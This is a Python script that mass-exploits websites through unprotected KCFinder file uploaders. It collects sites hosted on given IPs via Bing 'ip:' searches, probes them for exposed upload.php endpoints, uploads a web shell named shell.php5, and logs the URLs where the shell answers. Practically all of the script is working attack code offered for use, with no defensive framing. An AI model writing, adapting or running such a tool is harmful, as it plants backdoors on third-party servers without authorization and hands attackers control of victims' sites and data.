import requests
import re, os
from urlparse import urlparse
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)
os.system("clear")

def ngaco():
    logox = """
                  
  _  __    ______             _           
 | |/ /   |  ____(           | |          
 | ' / ___| |__   _ _ __   __| | ___ _ __* 
 |  < / __|  __| | | '_ \ / _` |/ _ \ '__|*
 | . \ (__| |**  | | | | | (_| |  __/ |* *  
 |_|\_\___|_|*   |_|_| |_|\__,_|\___|_|*
 ---------------Reverse-IP------------
 Author: GHz7
 Team: PsychoXploit
 Created: 14-02-20
    """
    print(logox)
    try:
        Agent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0"}
        gr = raw_input('Give me List Ip: ')
        gr = open(gr,'r')
        for done in gr:
            try:
                remo = []
                page = 1
                while page < 251:
                    bing = "http://www.bing.com/search?q=ip%3A"+done+"+&count=50&first="+str(page)
                    opene = requests.get(bing,verify=False,headers=Agent)
                    read = opene.content
                    findwebs = re.findall('<h2><a href="(.*?)"', read)
                    for i in findwebs:
                        o = i.split('/')
                        if (o[0]+'//'+o[2]) in remo:
                            pass
                        else:
                            remo.append(o[0]+'//'+o[2])
                            x = o[0]+'//'+o[2]
                            try:
                                df = {'/adminpanel/ckeditor/kcfinder/upload.php','/kcfinder/upload.php','/admin/kcfinder/upload.php','/ckeditor/kcfindeer/upload.php','/assets/kcfinder/upload.php'}
                                for bf in df:
                                    cr = bf.replace('\n\n','')
                                    fak = x+cr
                                    dd = requests.get(fak, allow_redirects=False,verify=False)
                                    if dd.status_code == 200:
                                        print(fak+' ==>\033[1;32;40m Found!\033[0;37;40m')
                                        shell = {'Filedata':open('shell.php5', 'rb')}
                                        tusuk = requests.post(fak, files=shell, headers=Agent, verify=False)
                                        n = {'/adminpanel/ckeditor/kcfinder/upload/files/shell.php5','/upload/files/shell.php5','/admin/kcfinder/upload/files/shell.php5','/kcfinder/upload/files/shell.php5','/assets/kcfinder/upload/files/shell.php5','/images/upload/files/shell.php5','/admin/upload/files/shell.php5'}
                                        for jnck in n:
                                            ls = jnck.replace('\n\n','')
                                            fak2 = fak
                                            z = urlparse(fak2)
                                            xnxx = z.scheme+'://'+z.netloc+ls
                                            mmk = requests.get(xnxx, allow_redirects=False, verify=False)
                                            if 'GHz7' in mmk.text:
                                                print(x+'  ==>\033[1;32;40m Success\033[0;37;40m')
                                                open('success.txt', 'a').write(xnxx+'\n')
                                            else:
                                                pass
                                    else:
                                       print(fak+' ==>\033[1;31;40m Notfound!\033[0;37;40m')
                            except Exception as e:
                                pass
                            except KeyboardInterrupt:
                                print("\nGo to hell!")
                                exit()           
                    page = page+5
            except Exception as e:
                continue
            except KeyboardInterrupt:
                print('\nGoodBoy!')
                exit()
    except KeyboardInterrupt:
        print('\nYaela Gaasik lo:(')
        exit()

if __name__ == '__main__':
    ngaco()
